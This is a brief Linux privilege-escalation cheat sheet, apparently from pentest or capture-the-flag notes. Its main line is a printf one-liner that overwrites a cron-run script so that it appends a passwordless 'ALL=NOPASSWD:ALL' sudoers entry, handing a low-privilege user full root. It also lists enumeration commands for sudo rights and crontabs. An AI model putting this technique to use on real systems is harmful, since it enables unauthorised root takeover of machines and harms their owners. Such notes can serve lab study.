if you're in such an unprivileged account it has no editor, run the following to get something appended to a cron job script:
``printf '#!/bin/bash\necho "<user> ALL=NOPASSWD:ALL" >> /etc/sudoers' > <script>``

sudo -l (list out sudo file)

crontab -l to list user's crontab

/etc/crontab system crontab, viewable as a regular user
